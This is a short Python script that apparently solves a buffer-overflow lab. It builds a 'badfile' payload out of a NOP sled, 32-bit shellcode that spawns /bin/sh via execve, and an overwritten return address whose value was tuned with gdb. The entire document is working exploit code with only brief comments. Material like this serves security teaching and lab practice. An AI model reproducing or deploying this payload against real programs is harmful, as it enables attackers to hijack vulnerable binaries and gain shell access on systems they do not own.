#!/usr/bin/python3
import sys

badfilesize = 517
# Replace the content with the actual shellcode
# You may copy it from ../shellcode/call_shellcode.c
# len(32bit shellcode)=27; len(64bit shellcode)=30
shellcode32= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80" 
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(badfilesize)) 

##################################################################
# Put the shellcode32 somewhere in the payload
start = 440               # Change this number, must be less than buffer size - shellcode32 size, larger than offset
content[start:start + len(shellcode32)] = shellcode32

# Decide the return address value, use gdb on the debug version
# and put it somewhere in the payload
ret    = 0xffffca3c+250           # Change this number to be &buffer+250(compensate info added by gdb)
offset = 108+4              # Change this number to be ($ebp-&buffer)+4

# The offset must be multiple of address size
L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
